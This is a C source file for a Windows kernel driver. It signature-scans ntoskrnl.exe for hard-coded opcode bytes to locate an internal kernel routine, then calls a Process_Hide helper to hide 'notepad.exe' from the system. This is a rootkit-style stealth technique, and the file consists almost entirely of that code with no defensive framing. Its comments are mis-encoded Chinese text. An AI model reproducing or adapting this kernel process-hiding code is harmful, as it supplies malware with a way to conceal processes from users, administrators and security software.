#pragma once
#include<ntifs.h>
#include"OpcodeTool.h"
VOID DRIVERUNLOAD(_In_ struct _DRIVER_OBJECT* DriverObject)
{

}
//ע�� ȥ��ȫ�ֱ�����call�ĵ�ַ
unsigned char a[] =
{
  0x8B, 0xFF, 0x55, 0x8B, 0xEC, 0x51, 0x53, 0x8B, 0x5D, 0x08,
  0x56, 0x57, 0x6A, 0x01
};
unsigned char b[] =
{
  0xB1, 0x1B, 0x88, 0x45, 0x0B, 0x3A, 0xC1, 0x73, 0x06
};
NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg)
{
	pDriver->DriverUnload = DRIVERUNLOAD;
	//DbgBreakPoint();
	Opcode op = { 0 };
	op.Buffer1 = a;
	op.Buffer2 = b;
	op.len1 = sizeof(a);
	op.len2 = sizeof(b);
	op.Offest = 0x1E;
	ULONG_PTR addrofimage = 0;
	ULONG_PTR sizeofimage = QuerySysModule("ntoskrnl.exe", &addrofimage);
	if (!sizeofimage) return 0;
	ULONG_PTR addrofop = FindOpcode(addrofimage,sizeofimage, &op);
	if (!addrofop) return 0;
	KdPrintEx((77,0,"Ӳ�����ַ:%x\n", addrofop));
	//EnumProcess();
	Process_Hide("notepad.exe", addrofop);
	return STATUS_SUCCESS;
}
